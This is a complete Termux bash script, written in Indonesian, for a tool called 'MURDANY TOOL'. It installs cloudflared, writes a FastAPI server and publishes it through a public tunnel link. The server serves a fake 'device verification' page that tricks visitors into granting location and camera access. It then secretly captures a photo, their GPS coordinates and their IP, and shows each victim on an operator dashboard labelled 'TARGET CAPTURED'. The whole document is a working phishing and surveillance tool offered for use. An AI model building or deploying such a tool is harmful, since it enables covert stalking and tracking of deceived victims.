#!/data/data/com.termux/files/usr/bin/bash

# Warna Neon Blue
NB='\033[1;36m'
BL='\033[1;34m'
NC='\033[0m'

clear
echo -e "${NB}"
echo "╔══════════════════════════════════════════╗"
echo "║             MURDANY TOOL                 ║"
echo "║        Neon Blue Dashboard Engine        ║"
echo "╚══════════════════════════════════════════╝"
echo -e "${NC}"

# Cek dependensi
if ! command -v python &>/dev/null; then echo "Install python dulu: pkg install python"; exit 1; fi
if [ ! -f "$HOME/cloudflared" ]; then echo "Cloudflared belum ada, mendownload..."; wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O $HOME/cloudflared && chmod +x $HOME/cloudflared; fi

# Tulis file python otomatis kalau belum ada
if [ ! -f "$HOME/sipel.py" ]; then
    echo -e "${BL}[*] Membuat file engine Python...${NC}"
    cat << 'PYEOF' > $HOME/sipel.py
import json, os, time
from pathlib import Path
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import uvicorn

app = FastAPI()
DB = Path(os.path.expanduser("~/sipel_db.json"))
if not DB.exists(): DB.write_text("[]")
def get_db(): return json.loads(DB.read_text())
def save_db(d): DB.write_text(json.dumps(d))

TARGET_HTML = """
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verifikasi Sistem</title>
<style>
body{font-family:system-ui;background:#111;color:#eee;text-align:center;padding:50px 20px}
button{width:100%;padding:15px;margin:10px 0;border:0;border-radius:8px;background:#2a6;color:#fff;font-size:16px;font-weight:bold}
button.alt{background:#345}
video{display:none} canvas{display:none}
</style></head><body>
<h2>Verifikasi Perangkat</h2>
<p>Halaman ini membutuhkan izin lokasi dan kamera.</p>
<button onclick="ambilLokasi()">1. Izinkan Lokasi</button>
<button class="alt" onclick="mulaiKamera()">2. Izinkan Kamera</button>
<button class="alt" onclick="kirimSemua()" style="background:#d29922;color:#000">3. Kirim Data</button>
<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>
<div id="log" style="color:#6cf;margin-top:20px;font-size:14px">Menunggu izin...</div>
<script>
let stream=null, loc=null;
async function ambilLokasi(){
  if(!navigator.geolocation) return document.getElementById('log').innerText="Gagal: Tidak didukung.";
  document.getElementById('log').innerText="Meminta izin lokasi...";
  navigator.geolocation.getCurrentPosition(
    p => { loc={lat:p.coords.latitude, lon:p.coords.longitude}; document.getElementById('log').innerText="Lokasi OK."; },
    e => document.getElementById('log').innerText="Izin lokasi ditolak."
  );
}
async function mulaiKamera(){
  try{
    stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
    document.getElementById('v').srcObject=stream;
    document.getElementById('log').innerText="Kamera OK.";
  }catch(e){ document.getElementById('log').innerText="Izin kamera ditolak."; }
}
async function kirimSemua(){
  if(!loc) return document.getElementById('log').innerText="Klik Izinkan Lokasi dulu.";
  if(!stream) return document.getElementById('log').innerText="Klik Izinkan Kamera dulu.";
  const v=document.getElementById('v'), c=document.getElementById('c');
  c.width=v.videoWidth; c.height=v.videoHeight;
  c.getContext('2d').drawImage(v,0,0);
  const foto=c.toDataURL('image/jpeg',0.5);
  document.getElementById('log').innerText="Mengirim...";
  await fetch('/api/submit',{
    method:'POST', headers:{'Content-Type':'application/json'},
    body:JSON.stringify({lat:loc.lat, lon:loc.lon, foto:foto})
  });
  document.getElementById('log').innerText="Berhasil terkirim!";
}
</script></body></html>
"""

DASH_HTML = """
<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>MURDANY Dashboard</title>
<style>
:root{--bg:#0d1117;--panel:#161b22;--border:#30363d;--cyan:#00e5ff}
body{background:var(--bg);color:#c9d1d9;font-family:monospace;padding:10px;max-width:500px;margin:auto}
.card{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:10px;margin-bottom:15px;display:flex;gap:10px;position:relative}
.badge{position:absolute;top:-10px;left:50%;transform:translateX(-50%);background:#da3633;color:#fff;font-size:10px;padding:2px 8px;border-radius:4px;font-weight:bold}
.left{flex:1} .left img{width:100%;border:1px solid var(--cyan);border-radius:4px}
.right{flex:1.2;font-size:11px;line-height:1.4}
.label{color:var(--cyan);font-weight:bold}
.footer{text-align:center;font-size:9px;color:#2ea043;margin-top:20px;letter-spacing:1px}
</style></head><body>
<h3 style="color:var(--cyan);text-align:center">MURDANY DASHBOARD</h3>
<div id="list">Menunggu data...</div>
<div class="footer">SYSTEM ENGINE BY MURDANY © 2026</div>
<script>
async function tick(){
  const res = await fetch('/api/data');
  const data = await res.json();
  const c = document.getElementById('list');
  c.innerHTML = '';
  if(data.length===0) return c.innerHTML = '<p style="text-align:center;color:#888">Belum ada data masuk.</p>';
  data.reverse().forEach((d, i) => {
    const div = document.createElement('div');
    div.className = 'card';
    div.innerHTML = `
      <div class="badge">TARGET CAPTURED</div>
      <div class="left"><img src="${d.foto || 'https://via.placeholder.com/150/111/333?text=No+Image'}"></div>
      <div class="right">
        <div><span class="label">LOG SEQ:</span> #${d.seq}</div>
        <div><span class="label">WAKTU:</span> <br>${d.waktu}</div>
        <div><span class="label">IP:</span> <br>${d.ip}</div>
        <div><span class="label">KOORDINAT:</span> <br>${d.lat}, ${d.lon}</div>
        <div><span class="label">MAPS:</span> <a href="https://maps.google.com/?q=${d.lat},${d.lon}" target="_blank" style="color:#6cf">LIHAT</a></div>
      </div>
    `;
    c.appendChild(div);
  });
}
setInterval(tick, 3000); tick();
</script></body></html>
"""

@app.get("/", response_class=HTMLResponse)
def dash(): return DASH_HTML

@app.get("/target", response_class=HTMLResponse)
def target(): return TARGET_HTML

@app.post("/api/submit")
async def submit(request: Request):
    body = await request.json()
    ip = request.client.host
    now = time.strftime("%d-%m-%Y<br>%H:%M:%S")
    db = get_db()
    db.append({"seq": len(db)+1, "ip": ip, "waktu": now, "lat": body.get("lat"), "lon": body.get("lon"), "foto": body.get("foto")})
    save_db(db)
    return {"status":"ok"}

@app.get("/api/data")
def get_data(): return get_db()

if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
PYEOF
fi

# Fungsi Start Background
start_tool() {
    echo -e "${NB}[*] Mengaktifkan Wake Lock & Menjalankan Server...${NC}"
    termux-wake-lock
    
    # Kill sisa proses lama
    pkill -f sipel.py 2>/dev/null
    pkill -f cloudflared 2>/dev/null
    
    # Jalankan Python Server di background
    nohup python $HOME/sipel.py > $HOME/sipel.log 2>&1 &
    sleep 3
    
    # Jalankan Cloudflare Tunnel di background
    nohup $HOME/cloudflared tunnel --url http://127.0.0.1:8000 > $HOME/tunnel.log 2>&1 &
    
    echo -e "${NB}[*] Menunggu link Cloudflare...${NC}"
    sleep 6
    
    # Ambil Link
    LINK=$(grep -o 'https://[a-zA-Z0-9.-]*\.trycloudflare\.com' $HOME/tunnel.log | head -n 1)
    
    if [ -z "$LINK" ]; then
        echo -e "\033[1;31m[!] Gagal mendapat link. Cek log: $HOME/tunnel.log\033[0m"
    else
        echo -e "${NB}==============================================${NC}"
        echo -e "${NB} LINK BERHASIL DIBUAT (BACKGROUND AKTIF) ${NC}"
        echo -e "${NB}==============================================${NC}"
        echo -e "Dashboard : ${LINK}/"
        echo -e "Target    : ${LINK}/target"
        echo -e "${NB}==============================================${NC}"
        echo -e "Tool tetap berjalan walau Termux ditutup."
        echo -e "Matikan dengan perintah: pkill -f sipel.py && pkill -f cloudflared"
    fi
}

start_tool
